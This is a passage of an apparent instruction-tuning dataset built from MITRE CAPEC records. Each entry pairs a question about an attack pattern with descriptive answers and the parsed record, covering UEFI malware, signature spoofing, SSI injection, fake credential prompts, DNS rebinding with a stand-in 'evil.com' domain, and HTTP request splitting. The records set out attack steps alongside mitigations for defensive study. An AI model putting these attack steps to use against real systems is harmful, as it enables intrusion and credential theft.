    "output": "Examples of Server Motherboard Compromise (CAPEC ID: 677) are: Malware is inserted into the Unified Extensible Firmware Interface (UEFI) software that resides on a flash memory chip soldered to a computer\u2019s motherboard. It is the first thing to turn on when a system is booted and is allowed access to almost every part of the operating system. Hence, the malware will have extensive control over operating system functions and persist after system reboots. [REF-685]",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Malware is inserted into the Unified Extensible Firmware Interface (UEFI) software that resides on a flash memory chip soldered to a computer\u2019s motherboard. It is the first thing to turn on when a system is booted and is allowed access to almost every part of the operating system. Hence, the malware will have extensive control over operating system functions and persist after system reboots. [REF-685]",
      "@Name": "Server Motherboard Compromise (CAPEC ID: 677)",
      "attack_ptrn": {
        "@ID": "677",
        "@Name": "Server Motherboard Compromise",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": {
          "xhtml:p": "Malware is inserted in a server motherboard (e.g., in the flash memory) in order to alter server functionality from that intended. The development environment or hardware/software support activity environment is susceptible to an adversary inserting malicious software into hardware components during development or update."
        },
        "Likelihood_Of_Attack": "Low",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "534"
          }
        },
        "Prerequisites": {
          "Prerequisite": "An adversary with access to hardware/software processes and tools within the development or hardware/software support environment can insert malicious software into hardware components during development or update/maintenance."
        },
        "Consequences": {
          "Consequence": {
            "Scope": "Integrity",
            "Impact": "Execute Unauthorized Commands"
          }
        },
        "Mitigations": {
          "Mitigation": [
            "Purchase IT systems, components and parts from government approved vendors whenever possible.",
            "Establish diversity among suppliers.",
            "Conduct rigorous threat assessments of suppliers.",
            "Require that Bills of Material (BoM) for critical parts and components be certified.",
            "Utilize contract language requiring contractors and subcontractors to flow down to subcontractors and suppliers SCRM and SCRA (Supply Chain Risk Assessment) requirements.",
            "Establish trusted supplier networks."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": "Malware is inserted into the Unified Extensible Firmware Interface (UEFI) software that resides on a flash memory chip soldered to a computer\u2019s motherboard. It is the first thing to turn on when a system is booted and is allowed access to almost every part of the operating system. Hence, the malware will have extensive control over operating system functions and persist after system reboots. [REF-685]"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": {
            "@Taxonomy_Name": "ATTACK",
            "Entry_ID": "1195.003",
            "Entry_Name": "Supply Chain Compromise: Compromise Hardware Supply Chain"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-439"
            },
            {
              "@External_Reference_ID": "REF-660"
            },
            {
              "@External_Reference_ID": "REF-685"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2021-10-21"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated @Name"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2023-01-24",
            "#text": "Server Functionality Compromise"
          }
        }
      }
    }
  },
  {
    "instruction": "How can I implement attack pattern - Signature Spoof (CAPEC ID: 473)",
    "context": "",
    "output": "Examples of Signature Spoof (CAPEC ID: 473) are: An attacker provides a victim with a malicious executable disguised as a legitimate executable from an established software by signing the executable with a forged cryptographic key. The victim's operating system attempts to verify the executable by checking the signature, the signature is considered valid, and the attackers' malicious executable runs.\n- An attacker exploits weaknesses in a cryptographic algorithm to that allow a private key for a legitimate software vendor to be reconstructed, attacker-created malicious software is cryptographically signed with the reconstructed key, and is installed by the victim operating system disguised as a legitimate software update from the software vendor.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "An attacker provides a victim with a malicious executable disguised as a legitimate executable from an established software by signing the executable with a forged cryptographic key. The victim's operating system attempts to verify the executable by checking the signature, the signature is considered valid, and the attackers' malicious executable runs.",
        "An attacker exploits weaknesses in a cryptographic algorithm to that allow a private key for a legitimate software vendor to be reconstructed, attacker-created malicious software is cryptographically signed with the reconstructed key, and is installed by the victim operating system disguised as a legitimate software update from the software vendor."
      ],
      "@Name": "Signature Spoof (CAPEC ID: 473)",
      "attack_ptrn": {
        "@ID": "473",
        "@Name": "Signature Spoof",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An attacker generates a message or datablock that causes the recipient to believe that the message or datablock was generated and cryptographically signed by an authoritative or reputable source, misleading a victim or victim operating system into performing malicious actions.",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "151",
            "Exclude_Related": [
              {
                "@Exclude_ID": "515"
              },
              {
                "@Exclude_ID": "512"
              },
              {
                "@Exclude_ID": "403"
              }
            ]
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "The victim or victim system is dependent upon a cryptographic signature-based verification system for validation of one or more security events or actions.",
            "The validation can be bypassed via an attacker-provided signature that makes it appear that the legitimate authoritative or reputable source provided the signature."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "High",
            "#text": "Technical understanding of how signature verification algorithms work with data and applications"
          }
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Access Control",
              "Authentication"
            ],
            "Impact": "Gain Privileges"
          }
        },
        "Example_Instances": {
          "Example": [
            "An attacker provides a victim with a malicious executable disguised as a legitimate executable from an established software by signing the executable with a forged cryptographic key. The victim's operating system attempts to verify the executable by checking the signature, the signature is considered valid, and the attackers' malicious executable runs.",
            "An attacker exploits weaknesses in a cryptographic algorithm to that allow a private key for a legitimate software vendor to be reconstructed, attacker-created malicious software is cryptographically signed with the reconstructed key, and is installed by the victim operating system disguised as a legitimate software update from the software vendor."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "20"
            },
            {
              "@CWE_ID": "327"
            },
            {
              "@CWE_ID": "290"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1036.001",
              "Entry_Name": "Masquerading: Invalid Code Signature"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1553.002",
              "Entry_Name": "Subvert Trust Controls: Code Signing"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Related_Attack_Patterns, Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List examples for 'Server Side Include (SSI) Injection (CAPEC ID: 101)' attack pattern",
    "context": "",
    "output": "Example instances for attack pattern - Server Side Include (SSI) Injection (CAPEC ID: 101) are: Consider a website hosted on a server that permits Server Side Includes (SSI), such as Apache with the \"Options Includes\" directive enabled.\nWhenever an error occurs, the HTTP Headers along with the entire request are logged, which can then be displayed on a page that allows review of such errors. A malicious user can inject SSI directives in the HTTP Headers of a request designed to create an error.\nWhen these logs are eventually reviewed, the server parses the SSI directives and executes them.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "Consider a website hosted on a server that permits Server Side Includes (SSI), such as Apache with the \"Options Includes\" directive enabled.",
        "Whenever an error occurs, the HTTP Headers along with the entire request are logged, which can then be displayed on a page that allows review of such errors. A malicious user can inject SSI directives in the HTTP Headers of a request designed to create an error.",
        "When these logs are eventually reviewed, the server parses the SSI directives and executes them."
      ],
      "@Name": "Server Side Include (SSI) Injection (CAPEC ID: 101)",
      "attack_ptrn": {
        "@ID": "101",
        "@Name": "Server Side Include (SSI) Injection",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker can use Server Side Include (SSI) Injection to send code to a web application that then gets executed by the web server. Doing so enables the attacker to achieve similar results to Cross Site Scripting, viz., arbitrary code execution and information disclosure, albeit on a more limited scale, since the SSI directives are nowhere near as powerful as a full-fledged scripting language. Nonetheless, the attacker can conveniently gain access to sensitive files, such as password files, and execute shell commands.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "253"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "600"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine applicability] The adversary determines whether server side includes are enabled on the target web server.",
              "Technique": [
                "Look for popular page file names. The attacker will look for .shtml, .shtm, .asp, .aspx, and other well-known strings in URLs to help determine whether SSI functionality is enabled.",
                "Fetch .htaccess file. In Apache web server installations, the .htaccess file may enable server side includes in specific locations. In those cases, the .htaccess file lives inside the directory where SSI is enabled, and is theoretically fetchable from the web server. Although most web servers deny fetching the .htaccess file, a misconfigured server will allow it. Thus, an attacker will frequently try it."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Find Injection Point] Look for user controllable input, including HTTP headers, that can carry server side include directives to the web server.",
              "Technique": [
                "Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.",
                "Use a proxy tool to record all links visited during a manual traversal of the web application. Make special note of any links that include parameters in the URL. Manual traversal of this type is frequently necessary to identify forms that are GET method forms rather than POST forms."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Inject SSI] Using the found injection point, the adversary sends arbitrary code to be inlcuded by the application on the server side. They may then need to view a particular page in order to have the server execute the include directive and run a command or open a file on behalf of the adversary."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "A web server that supports server side includes and has them enabled",
            "User controllable input that can carry include directives to the web server"
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "The attacker needs to be aware of SSI technology, determine the nature of injection and be able to craft input that results in the SSI directives being executed."
          }
        },
        "Resources_Required": {
          "Resource": "None: No specialized resources are required to execute this type of attack. Determining whether the server supports SSI does not require special tools, and nor does injecting directives that get executed. Spidering tools can make the task of finding and following links easier."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Set the OPTIONS IncludesNOEXEC in the global access.conf file or local .htaccess (Apache) file to deny SSI execution in directories that do not need them",
            "All user controllable input must be appropriately sanitized before use in the application. This includes omitting, or encoding, certain characters or strings that have the potential of being interpreted as part of an SSI directive",
            "Server Side Includes must be enabled only if there is a strong business reason to do so. Every additional component enabled on the web server increases the attack surface as well as administrative overhead"
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "Consider a website hosted on a server that permits Server Side Includes (SSI), such as Apache with the \"Options Includes\" directive enabled.",
              "Whenever an error occurs, the HTTP Headers along with the entire request are logged, which can then be displayed on a page that allows review of such errors. A malicious user can inject SSI directives in the HTTP Headers of a request designed to create an error.",
              "When these logs are eventually reviewed, the server parses the SSI directives and executes them."
            ]
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "97"
            },
            {
              "@CWE_ID": "74"
            },
            {
              "@CWE_ID": "20"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "WASC",
              "Entry_ID": "36",
              "Entry_Name": "SSI Injection"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "Server-Side Includes (SSI) Injection"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-610",
            "@Section": "Testing for SSI Injection"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated References, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Related_Attack_Patterns, Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-10-21",
              "Modification_Comment": "Updated Execution_Flow"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'Credential Prompt Impersonation (CAPEC ID: 654)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: An adversary monitors the system task list for Microsoft Outlook in an attempt to determine when the application may prompt the user to enter their credentials to view encrypted email. Once the task is executed, the adversary impersonates the credential prompt to obtain the user's Microsoft Outlook encryption credentials. These credentials can then be leveraged by the adversary to read a user's encrypted email.\nAn adversary randomly prompts a user to enter their system credentials, tricking the user into believing that a background process requires the credentials to function. The adversary can then use these gleaned credentials to execute additional attacks or obtain data.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": [
        "An adversary monitors the system task list for Microsoft Outlook in an attempt to determine when the application may prompt the user to enter their credentials to view encrypted email. Once the task is executed, the adversary impersonates the credential prompt to obtain the user's Microsoft Outlook encryption credentials. These credentials can then be leveraged by the adversary to read a user's encrypted email.",
        "An adversary randomly prompts a user to enter their system credentials, tricking the user into believing that a background process requires the credentials to function. The adversary can then use these gleaned credentials to execute additional attacks or obtain data."
      ],
      "@Name": "Credential Prompt Impersonation (CAPEC ID: 654)",
      "attack_ptrn": {
        "@ID": "654",
        "@Name": "Credential Prompt Impersonation",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary, through a previously installed malicious application, impersonates a credential prompt in an attempt to steal a user's credentials.",
        "Extended_Description": {
          "xhtml:p": [
            "The adversary may monitor the task list maintained by the operating system and wait for a specific legitimate credential prompt to become active. Once the prompt is detected, the adversary launches a new credential prompt in the foreground that mimics the user interface of the legitimate credential prompt. At this point, the user thinks that they are interacting with the legitimate credential prompt, but instead they are interacting with the malicious credential prompt.",
            "A second approach involves the adversary impersonating an unexpected credential prompt, but one that may often be spawned by legitimate background processes. For example, an adversary may randomly impersonate a system credential prompt, implying that a background process or commonly used application (e.g., email reader) requires authentication for some purpose. The user, believing they are interacting with a legitimate credential prompt, enters their credentials which the adversary then leverages for nefarious purposes. The ultimate goal of this attack is to obtain sensitive information (e.g., credentials) from the user."
          ]
        },
        "Likelihood_Of_Attack": "Medium",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "504"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Determine suitable tasks to exploit] Determine what tasks exist on the target system that may result in a user providing their credentials.",
              "Technique": "Determine what tasks prompt a user for their credentials."
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "[Impersonate Task] Impersonate a legitimate task, either expected or unexpected, in an attempt to gain user credentials.",
              "Technique": "Prompt a user for their credentials, while making the user believe the credential request is legitimate."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "The adversary must already have access to the target system via some means.",
            "A legitimate task must exist that an adversary can impersonate to glean credentials."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Once an adversary has gained access to the target system, impersonating a credential prompt is not difficult."
          }
        },
        "Resources_Required": {
          "Resource": [
            "Malware or some other means to initially comprise the target system.",
            "Additional malware to impersonate a legitimate credential prompt."
          ]
        },
        "Indicators": {
          "Indicator": "Credential prompts that appear illegitimate or unexpected."
        },
        "Consequences": {
          "Consequence": {
            "Scope": [
              "Access Control",
              "Authentication"
            ],
            "Impact": "Gain Privileges"
          }
        },
        "Mitigations": {
          "Mitigation": "The only known mitigation to this attack is to avoid installing the malicious application on the device. However, to impersonate a running task the malicious application does need the GET_TASKS permission to be able to query the task list, and being suspicious of applications with that permission can help."
        },
        "Example_Instances": {
          "Example": [
            "An adversary monitors the system task list for Microsoft Outlook in an attempt to determine when the application may prompt the user to enter their credentials to view encrypted email. Once the task is executed, the adversary impersonates the credential prompt to obtain the user's Microsoft Outlook encryption credentials. These credentials can then be leveraged by the adversary to read a user's encrypted email.",
            "An adversary randomly prompts a user to enter their system credentials, tricking the user into believing that a background process requires the credentials to function. The adversary can then use these gleaned credentials to execute additional attacks or obtain data."
          ]
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "1021"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1056",
              "Entry_Name": "Input Capture"
            },
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1548.004",
              "Entry_Name": "Abuse Elevation Control Mechanism: Elevated Execution with Prompt"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2020-07-30"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Are there any examples for 'DNS Rebinding (CAPEC ID: 275)' attack pattern",
    "context": "",
    "output": "Yes. You can have a look at the following example: The adversary registers a domain name, such as www.evil.com with IP address 1.3.5.7, delegates it to their own DNS server (1.3.5.2), and uses phishing links or emails to get HTTP traffic. Instead of sending a normal TTL record, the DNS server sends a very short TTL record (for example, 1 second), preventing DNS response of entry[www.evil.com, 1.3.5.7] from being cached on victim's (192.168.1.10) browser. The adversary's server first responds to the victim with malicious script such as JavaScript, containing IP address (1.3.5.7) of the server. The adversary uses XMLHttpRequest (XHR) to send HTTP request or HTTPS request directly to the adversary's server and load response. The malicious script allows the adversary to rebind the host name to the IP address (192.168.1.2) of a target server that is behind the firewall. Then the server responds to the adversary's real target, which is an internal host IP (192.168.1.2) in the same domain of the victim (192.168.1.10). Because the same name resolves to both these IP addresses, browsers will place both IP addresses (1.3.5.7 and 192.168.1.2) in the same security zone and allow information to flow between the addresses. Further, the adversary can achieve scanning and accessing all internal hosts in the victim's local network (192.168.X.X) by sending multiple short-lived IP addresses.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "The adversary registers a domain name, such as www.evil.com with IP address 1.3.5.7, delegates it to their own DNS server (1.3.5.2), and uses phishing links or emails to get HTTP traffic. Instead of sending a normal TTL record, the DNS server sends a very short TTL record (for example, 1 second), preventing DNS response of entry[www.evil.com, 1.3.5.7] from being cached on victim's (192.168.1.10) browser. The adversary's server first responds to the victim with malicious script such as JavaScript, containing IP address (1.3.5.7) of the server. The adversary uses XMLHttpRequest (XHR) to send HTTP request or HTTPS request directly to the adversary's server and load response. The malicious script allows the adversary to rebind the host name to the IP address (192.168.1.2) of a target server that is behind the firewall. Then the server responds to the adversary's real target, which is an internal host IP (192.168.1.2) in the same domain of the victim (192.168.1.10). Because the same name resolves to both these IP addresses, browsers will place both IP addresses (1.3.5.7 and 192.168.1.2) in the same security zone and allow information to flow between the addresses. Further, the adversary can achieve scanning and accessing all internal hosts in the victim's local network (192.168.X.X) by sending multiple short-lived IP addresses.",
      "@Name": "DNS Rebinding (CAPEC ID: 275)",
      "attack_ptrn": {
        "@ID": "275",
        "@Name": "DNS Rebinding",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary serves content whose IP address is resolved by a DNS server that the adversary controls. After initial contact by a web browser (or similar client), the adversary changes the IP address to which its name resolves, to an address within the target organization that is not publicly accessible. This allows the web browser to examine this internal address on behalf of the adversary.",
        "Extended_Description": {
          "xhtml:p": "Web browsers enforce security zones based on DNS names in order to prevent cross-zone disclosure of information. Because the same name resolves to both these IP addresses, browsers will place both IP addresses in the same security zone and allow information to flow between the addresses. This allows adversaries to discover sensitive information about the internal network of an enterprise. If there is a trust relationship between the computer with the targeted browser and the internal machine the adversary identifies, additional attacks are possible. This attack differs from pharming attacks in that the adversary is the legitimate owner of the malicious DNS server and so does not need to compromise behavior of external DNS services."
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "194",
            "Exclude_Related": [
              {
                "@Exclude_ID": "515"
              },
              {
                "@Exclude_ID": "403"
              }
            ]
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify potential DNS rebinding targets] An adversary publishes content on their own server with their own name and DNS server. Attract HTTP traffic and explore rebinding vulnerabilities in browsers, flash players of old version.",
              "Technique": "Adversary uses Web advertisements to attract the victim to access adversary's DNS. Explore the versions of web browser or flash players in HTTP request."
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Establish initial target access to adversary DNS] The first time the target accesses the adversary's content, the adversary's name must be resolved to an IP address. The adversary's DNS server performs this resolution, providing a short Time-To-Live (TTL) in order to prevent the target from caching the value."
            },
            {
              "Step": "3",
              "Phase": "Experiment",
              "Description": "[Rebind DNS resolution to target address] The target makes a subsequent request to the adversary's content and the adversary's DNS server must again be queried, but this time the DNS server returns an address internal to the target's organization that would not be accessible from an outside source."
            },
            {
              "Step": "4",
              "Phase": "Experiment",
              "Description": "[Determine exploitability of DNS rebinding access to target address] The adversary can then use scripts in the content the target retrieved from the adversary in the original message to exfiltrate data from the named internal addresses."
            },
            {
              "Step": "5",
              "Phase": "Exploit",
              "Description": "[Access & exfiltrate data within the victim's security zone] The adversary can then use scripts in the content the target retrieved from the adversary in the original message to exfiltrate data from the internal addresses. This allows adversaries to discover sensitive information about the internal network of an enterprise.",
              "Technique": [
                "Adversary attempts to use victim's browser as an HTTP proxy to other resources inside the target's security zone. This allows two IP addresses placed in the same security zone.",
                "Adversary tries to scan and access all internal hosts in victim's local network by sending multiple short-lived IP addresses."
              ]
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "The target browser must access content server from the adversary controlled DNS name. Web advertisements are often used for this purpose. The target browser must honor the TTL value returned by the adversary and re-resolve the adversary's DNS name after initial contact."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Setup DNS server and the adversary's web server. Write a malicious script to allow the victim to connect to the web server."
          }
        },
        "Resources_Required": {
          "Resource": "The adversary must serve some web content that a victim accesses initially. This content must include executable content that queries the adversary's DNS name (to provide the second DNS resolution) and then performs the follow-on attack against the internal system. The adversary also requires a customized DNS server that serves an IP address for their registered DNS name, but which resolves subsequent requests by a single client to addresses internal to that client's network."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Authorization",
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": [
                "Accountability",
                "Authentication",
                "Authorization",
                "Non-Repudiation"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": [
                "Access Control",
                "Authorization"
              ],
              "Impact": "Bypass Protection Mechanism"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: IP Pinning causes browsers to record the IP address to which a given name resolves and continue using this address regardless of the TTL set in the DNS response. Unfortunately, this is incompatible with the design of some legitimate sites.",
            "Implementation: Reject HTTP request with a malicious Host header.",
            "Implementation: Employ DNS resolvers that prevent external names from resolving to internal addresses."
          ]
        },
        "Example_Instances": {
          "Example": "The adversary registers a domain name, such as www.evil.com with IP address 1.3.5.7, delegates it to their own DNS server (1.3.5.2), and uses phishing links or emails to get HTTP traffic. Instead of sending a normal TTL record, the DNS server sends a very short TTL record (for example, 1 second), preventing DNS response of entry[www.evil.com, 1.3.5.7] from being cached on victim's (192.168.1.10) browser. The adversary's server first responds to the victim with malicious script such as JavaScript, containing IP address (1.3.5.7) of the server. The adversary uses XMLHttpRequest (XHR) to send HTTP request or HTTPS request directly to the adversary's server and load response. The malicious script allows the adversary to rebind the host name to the IP address (192.168.1.2) of a target server that is behind the firewall. Then the server responds to the adversary's real target, which is an internal host IP (192.168.1.2) in the same domain of the victim (192.168.1.10). Because the same name resolves to both these IP addresses, browsers will place both IP addresses (1.3.5.7 and 192.168.1.2) in the same security zone and allow information to flow between the addresses. Further, the adversary can achieve scanning and accessing all internal hosts in the victim's local network (192.168.X.X) by sending multiple short-lived IP addresses."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "350"
          }
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-119"
            },
            {
              "@External_Reference_ID": "REF-120",
              "@Section": "DNS rebinding"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Payload_Activation_Impact, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attack_Phases, Attacker_Skills_or_Knowledge_Required, Description Summary, Examples-Instances, Payload, Related_Attack_Patterns, Solutions_and_Mitigations"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Consequences, Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: HTTP Request Splitting (CAPEC ID: 105), give me an example instances for this pattern",
    "context": "",
    "output": "Sure. Examples can be: Microsoft Internet Explorer versions 5.01 SP4 and prior, 6.0 SP2 and prior, and 7.0 contain a vulnerability that could allow an unauthenticated, remote adversary to conduct HTTP request splitting and smuggling attacks. The vulnerability is due to an input validation error in the browser that allows adversaries to manipulate certain headers to expose the browser to HTTP request splitting and smuggling attacks. Attacks may include cross-site scripting, proxy cache poisoning, and session fixation. In certain instances, an exploit could allow the adversary to bypass web application firewalls or other filtering devices. Microsoft has confirmed the vulnerability and released software updates.",
    "category": "CAPECFlan",
    "instruction_type": "capec_example_instances",
    "parsed_raw_data": {
      "Example_Instances": "Microsoft Internet Explorer versions 5.01 SP4 and prior, 6.0 SP2 and prior, and 7.0 contain a vulnerability that could allow an unauthenticated, remote adversary to conduct HTTP request splitting and smuggling attacks. The vulnerability is due to an input validation error in the browser that allows adversaries to manipulate certain headers to expose the browser to HTTP request splitting and smuggling attacks. Attacks may include cross-site scripting, proxy cache poisoning, and session fixation. In certain instances, an exploit could allow the adversary to bypass web application firewalls or other filtering devices. Microsoft has confirmed the vulnerability and released software updates.",
      "@Name": "HTTP Request Splitting (CAPEC ID: 105)",
      "attack_ptrn": {
        "@ID": "105",
        "@Name": "HTTP Request Splitting",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": {
          "xhtml:p": [
